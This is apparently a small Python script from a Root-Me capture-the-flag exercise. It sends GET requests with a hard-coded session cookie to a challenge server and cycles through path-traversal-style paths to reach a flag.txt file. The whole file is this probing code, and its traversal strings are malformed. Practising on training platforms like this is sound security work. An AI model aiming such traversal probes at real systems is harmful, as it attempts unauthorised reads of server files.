import requests

def make_request(path):
    # L'URL de base, ajustez-la selon votre contexte
    url = f"http://challenge01.root-me.org:59092/{path}"  # Remplacez localhost par votre domaine cible si nécessaire
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive',
        'session': '.eJwlzjEOwjAMBdC7ZGZwHP8m7mUq17EFa0snxN2pxPi29ylbHnE-y_o-rniU7TXLWnZu03SH0IyRtzpDk5MsNCV7a07KvbGg1g6uDQlJQp3TzaHQAE1RpAdVYlpMqlkbmbEPBA0ezULEugIZPm-4LKFgIi935Drj-G9Qvj-WXi8E.ZyIkpQ.MmGSwzxtvr4aIZIFFWbV8UBY8vg'
    }

    try:
        response = requests.get(url, headers=headers)
        # Affiche le code de statut de la réponse
        return response.status_code
    except requests.exceptions.RequestException as e:
        return None

if __name__ == "__main__":
    # Appelle la fonction avec le chemin demandé
    
    paths = ['']
    
    for i in range(7):
        paths.append('assets'+'..'*i+'/flag.txt')
        
    for path in paths:
        status_code = make_request(path)
        print(f"Status Code for '{path}': {status_code}")
